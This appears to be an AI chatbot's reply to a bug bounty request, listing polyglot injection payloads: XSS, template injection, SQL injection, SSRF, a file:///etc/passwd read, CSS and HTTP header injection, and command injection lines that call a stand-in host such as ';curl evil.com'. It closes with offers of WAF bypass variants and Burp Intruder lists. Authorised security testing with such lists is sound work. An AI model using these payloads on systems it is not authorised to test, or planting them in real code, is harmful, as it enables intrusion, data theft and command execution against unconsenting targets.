
# 🧨 Bug Bounty Polyglot Payload Collection




## 🔹 Universal HTML/JS Polyglots

These are designed to break out of contexts and trigger different types of injections:

```js
'"/><img src=x onerror=alert(1)>  // Basic HTML/JS injection
"><svg/onload=alert(1)>            // SVG tag payload
<script>alert(1)</script>         // Script tag
```

## 🔹 Polyglots for SSTI/CSTI/Template Injection

Test for template expression contexts in various engines (Jinja2, Handlebars, etc.):

```txt
${{7*7}}                 // JavaScript/Handlebars CSTI
{{7*7}}                  // Jinja2 (Python)
#{7*7}                   // Ruby ERB
<%= 7*7 %>               // JSP / ERB
```

## 🔹 SQLi + XSS + HTML Polyglots

Useful for fuzzing to detect multiple injection points:

```sql
'"--><script>alert(1)</script>   -- SQLi + XSS
'||1=1--><img src=x onerror=alert(1)> // SQLi bypass + XSS
' OR 1=1 --
```

## 🔹 URL Polyglots (for SSRF, Redirects, etc.)

```txt
http://127.0.0.1@evil.com/          // SSRF bypass using @
http://[::]                        // IPv6 localhost
file:///etc/passwd                // LFI test
```

## 🔹 Command Injection Polyglots

```bash
;curl evil.com  # Bash injection
`wget evil.com` // Command substitution
$(id)           // Bash injection in forms
|nslookup evil.com
```

## 🔹 CSS Injection Polyglots

```css
body{background:url('http://evil.com')}
<style>@import 'http://evil.com'</style>
```

## 🔹 JSON Polyglots

Used in API fuzzing or request bodies:

```json
{"key": "value", "malicious": "<script>alert(1)</script>"}
{"key": "${{7*7}}"}
```

## 🔹 HTTP Header Injection

```http
X-Forwarded-For: 127.0.0.1\r\nInjected-Header: yes
Referer: http://evil.com\r\nSet-Cookie: session=attacker
```

## 🔹 Full Context-Breaking Polyglot

```txt
'">{{7*7}}<script>alert(1)</script><!--
```

---

Let me know if you want:

- 🧪 More advanced payloads for each category
- 📦 Integration-ready Burp Intruder list
- 🛡️ WAF bypass variants
- 📄 PDF / CSV export for offline use

Here's your custom **Bug Bounty Polyglot Payload Collection**, organized by **injection context** and suitable for use in manual testing, Burp Suite, or automated recon:

👉 [View in Canvas on the side]

Let me know if you want:

- Full bypass variants for WAFs or specific security controls
- Integration into Burp Intruder, ZAP, or other tools
- A printable or CSV version for field use